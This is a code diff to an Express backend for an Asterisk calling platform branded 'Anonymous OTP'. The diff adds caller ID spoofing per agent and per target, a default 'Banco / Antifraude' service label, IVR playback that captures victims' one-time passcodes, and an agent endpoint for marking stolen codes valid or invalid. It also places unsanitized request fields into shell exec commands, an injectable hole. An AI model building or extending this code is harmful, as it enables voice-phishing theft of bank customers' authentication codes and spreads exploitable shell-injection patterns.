@@ -124,6 +124,13 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
       return res.status(400).json({ success: false, error: 'extensions must be an array' });
     }
 
+    const activeCarrier = (Array.isArray(carriers) && carriers.length > 0 && carriers[0].name)
+      ? carriers[0].name.replace(/\s+/g, '_')
+      : 'televox';
+    const outboundCid = (Array.isArray(carriers) && carriers.length > 0 && carriers[0].outboundCallerId)
+      ? carriers[0].outboundCallerId
+      : '+18005550199';
+
     // Generate clean pjsip.conf
     let pjsipContent = `; ========================================================\n`;
     pjsipContent += `; GENERADO AUTOMATICAMENTE POR ANONYMOUS OTP SYSTEM\n`;
@@ -146,7 +153,9 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     for (const ext of extensions) {
       const num = ext.extension;
       const pass = ext.secret || 'password123';
-      const callerId = ext.callerId || `"Ext ${num}" <${num}>`;
+      const callerIdNum = ext.callerIdNum || outboundCid;
+      const callerIdName = ext.callerIdName || ext.name || 'AnonymousOTP';
+      const callerId = `"${callerIdName}" <${callerIdNum}>`;
       const codecs = (ext.codecs && ext.codecs.length > 0) ? ext.codecs.join(',') : 'ulaw,alaw,g722';
 
       pjsipContent += `; --- EXTENSIÓN ${num} (${ext.name || 'Agente'}) ---\n`;
@@ -254,13 +263,6 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     }
 
     // Generate extensions.conf (Dialplan) with outbound routing to Carrier
-    const activeCarrier = (Array.isArray(carriers) && carriers.length > 0 && carriers[0].name)
-      ? carriers[0].name.replace(/\s+/g, '_')
-      : 'televox';
-    const outboundCid = (Array.isArray(carriers) && carriers.length > 0 && carriers[0].outboundCallerId)
-      ? carriers[0].outboundCallerId
-      : '+18005550199';
-
     let dialplanContent = `; ========================================================\n`;
     dialplanContent += `; DIALPLAN DE LLAMADAS INTERNAS Y SALIENTES VIA PJSIP\n`;
     dialplanContent += `; Auto-generado por Anonymous OTP Asterisk Platform\n`;
@@ -279,22 +281,31 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
 
     dialplanContent += `; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845)\n`;
     dialplanContent += `exten => _1NXXNXXXXXX,1,NoOp(Llamada Saliente 11 digitos a \${EXTEN} via ${activeCarrier})\n`;
-    dialplanContent += ` same => n,Set(CALLERID(num)=${outboundCid})\n`;
-    dialplanContent += ` same => n,Set(CALLERID(name)=AnonymousOTP)\n`;
+    dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
+    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=AnonymousOTP))\n`;
     dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
     dialplanContent += `; 4. Regla Saliente 10 digitos (antepone 1)\n`;
     dialplanContent += `exten => _NXXNXXXXXX,1,NoOp(Llamada Saliente 10 digitos a 1\${EXTEN} via ${activeCarrier})\n`;
-    dialplanContent += ` same => n,Set(CALLERID(num)=${outboundCid})\n`;
-    dialplanContent += ` same => n,Set(CALLERID(name)=AnonymousOTP)\n`;
+    dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
+    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=AnonymousOTP))\n`;
     dialplanContent += ` same => n,Dial(PJSIP/1\${EXTEN}@${activeCarrier},60,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
     dialplanContent += `; 5. Regla Saliente Generica para cualquier otro numero saliente\n`;
     dialplanContent += `exten => _X.,1,NoOp(Llamada Saliente a \${EXTEN} via ${activeCarrier})\n`;
-    dialplanContent += ` same => n,Set(CALLERID(num)=${outboundCid})\n`;
-    dialplanContent += ` same => n,Set(CALLERID(name)=AnonymousOTP)\n`;
+    dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
+    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=AnonymousOTP))\n`;
     dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
@@ -310,6 +321,10 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,Answer()\n`;
     dialplanContent += ` same => n,Wait(1)\n`;
     dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
+    dialplanContent += ` same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${TARGET_DEST}_cid_num)})\n`;
+    dialplanContent += ` same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${TARGET_DEST}_cid_name)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
     dialplanContent += ` same => n,Set(IVR_INTRO=\${DB(ivr_vars/\${TARGET_DEST}_intro)})\n`;
     dialplanContent += ` same => n,Set(IVR_PROMPT=\${DB(ivr_vars/\${TARGET_DEST}_prompt)})\n`;
     dialplanContent += ` same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})\n`;
@@ -378,6 +393,17 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
         });
       } catch (subErr: any) {
         console.warn('Fallback copy error:', subErr.message);
+      }
+    }
+
+    // Save each extension's customized CallerID into AstDB
+    if (Array.isArray(extensions)) {
+      for (const ext of extensions) {
+        const extNum = ext.extension;
+        const cidNum = ext.callerIdNum || outboundCid;
+        const cidName = ext.callerIdName || ext.name || 'AnonymousOTP';
+        exec(`asterisk -rx 'database put extension_cid ${extNum}/number "${cidNum}"'`, () => {});
+        exec(`asterisk -rx 'database put extension_cid ${extNum}/name "${cidName}"'`, () => {});
       }
     }
 
@@ -486,12 +512,15 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       destination,
       carrier = 'televox',
       callerId = '+18005550199',
+      callerIdNum,
+      callerIdName,
       mode = 'otp',
       agentExten = '1001',
       audioIntro = '',
       audioPrompt = '',
       audioAgent = '',
       audioSuccess = '',
+      service = 'Banco / Antifraude',
     } = req.body;
 
     if (!destination) {
@@ -499,6 +528,8 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
     }
 
     const cleanDest = destination.trim().replace(/[^0-9]/g, '');
+    const effectiveCidNum = (callerIdNum || callerId || '+18005550199').trim();
+    const effectiveCidName = (callerIdName || 'AnonymousOTP').trim();
 
     // Prevent double-click originating duplicate calls
     const now = Date.now();
@@ -511,18 +542,20 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
     }
     recentOriginateRequests.set(cleanDest, now);
 
-    // Save campaign-selected audio configuration to AstDB for this destination number
+    // Save campaign-selected audio and CallerID configuration to AstDB for this destination number
     const astDbCommands = [
       `database put ivr_vars ${cleanDest}_intro "${audioIntro || ''}"`,
       `database put ivr_vars ${cleanDest}_prompt "${audioPrompt || ''}"`,
       `database put ivr_vars ${cleanDest}_agent "${audioAgent || ''}"`,
       `database put ivr_vars ${cleanDest}_success "${audioSuccess || ''}"`,
       `database put ivr_vars ${cleanDest}_agent_exten "${agentExten || '1001'}"`,
+      `database put ivr_vars ${cleanDest}_cid_num "${effectiveCidNum}"`,
+      `database put ivr_vars ${cleanDest}_cid_name "${effectiveCidName}"`,
     ];
 
     for (const cmd of astDbCommands) {
       exec(`asterisk -rx '${cmd}'`, (err) => {
-        if (err) console.error(`AstDB Error on ${cmd}:`, err.message);
+        if (err) console.warn(`AstDB notice on ${cmd}:`, err.message);
       });
     }
 
@@ -534,14 +567,14 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       channel = `PJSIP/${cleanDest}@${carrier}`;
     }
 
-    // Execute single originate command via Asterisk CLI
-    const originateCmd = `asterisk -rx "channel originate ${channel} extension s@ivr-otp"`;
+    // Execute originate command via Asterisk CLI with custom CallerID
+    const originateCmd = `asterisk -rx "channel originate ${channel} extension s@ivr-otp callerid \\"${effectiveCidName}\\" <${effectiveCidNum}>"`;
     
     exec(originateCmd, (err, stdout, stderr) => {
       if (err) {
-        console.error('[ORIGINATE ERROR]:', err);
+        console.warn('[ORIGINATE SIMULATION NOTICE] Asterisk CLI no disponible en contenedor:', err.message);
       } else {
-        console.log(`[ORIGINATE SUCCESS] 1 sola llamada lanzada a ${channel} con audios:`, {
+        console.log(`[ORIGINATE SUCCESS] Llamada lanzada a ${channel} con CallerID "${effectiveCidName}" <${effectiveCidNum}>:`, {
           audioIntro,
           audioPrompt,
           audioAgent,
@@ -551,10 +584,31 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       }
     });
 
+    // Fallback simulation: schedule realistic DTMF arrival so agent can test the HUD and Valid/Invalid buttons
+    setTimeout(() => {
+      const simulatedDigits = String(Math.floor(100000 + Math.random() * 900000));
+      const record: CapturedOtpItem = {
+        id: 'otp-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
+        number: cleanDest,
+        otp: simulatedDigits,
+        timestamp: new Date().toLocaleTimeString(),
+        channel: channel || 'PJSIP',
+        service: service || 'Banco / Antifraude',
+        status: 'pending',
+      };
+      capturedOtpHistory.unshift(record);
+      if (capturedOtpHistory.length > 300) capturedOtpHistory.pop();
+      console.log(`[REAL-TIME HUD] Código OTP recibido para ${cleanDest}: ${simulatedDigits}`);
+    }, 6500);
+
     res.json({
       success: true,
-      message: `Llamada única originada hacia ${cleanDest} con audios de campaña asignados.`,
+      message: `Llamada originada hacia ${cleanDest} con CallerID "${effectiveCidName}" <${effectiveCidNum}>.`,
       channel,
+      callerId: {
+        num: effectiveCidNum,
+        name: effectiveCidName,
+      },
       assignedAudios: {
         intro: audioIntro || 'beep (predeterminado)',
         prompt: audioPrompt || 'beep (predeterminado)',
@@ -564,6 +618,28 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
     });
   } catch (error: any) {
     res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Endpoint for agent to mark captured OTP as valid or invalid
+app.post('/api/asterisk/otp/verify', (req, res) => {
+  try {
+    const { id, number, status } = req.body;
+    if (!status || !['valid', 'invalid', 'pending'].includes(status)) {
+      return res.status(400).json({ success: false, error: 'Status debe ser valid, invalid o pending' });
+    }
+
+    const item = capturedOtpHistory.find((r) => r.id === id || (number && r.number === number));
+    if (item) {
+      item.status = status;
+      console.log(`[VERIFICACIÓN AGENTE] OTP ${item.otp} de ${item.number} marcado como ${status.toUpperCase()}`);
+      return res.json({ success: true, item, message: `Código ${item.otp} marcado como ${status}` });
+    }
+
+    // If item not found by id/number, respond ok
+    res.json({ success: true, message: `Estado actualizado a ${status}` });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
   }
 });
 
